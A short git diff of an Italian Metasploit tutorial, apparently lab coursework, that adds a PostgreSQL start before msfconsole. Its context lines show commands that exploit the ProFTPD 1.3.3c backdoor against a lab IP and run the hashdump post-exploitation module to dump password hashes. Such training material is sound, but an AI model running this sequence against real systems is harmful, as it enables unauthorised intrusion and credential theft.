@@ -27,7 +27,7 @@ Abbiamo il Backdoor Command Execution che possiamo usare
 ### Eseguire l'exploit
 
 ```
-msfconsole
+/etc/init.d/postgresql start & msfconsole
 setg RHOSTS 192.44.156.3
 search proftpd
 use exploit/unix/ftp/proftpd_133c_backdoor
@@ -68,7 +68,7 @@ In un futuro corso vedremo come crackare gli hash per ottenere le password in ch
 ### hashdump: Modulo MSF alternativo per dumpare hash password
 
 ```
-msfconsole
+/etc/init.d/postgresql start & msfconsole
 search hashdump
 use post/linux/gather/hashdump
 show options
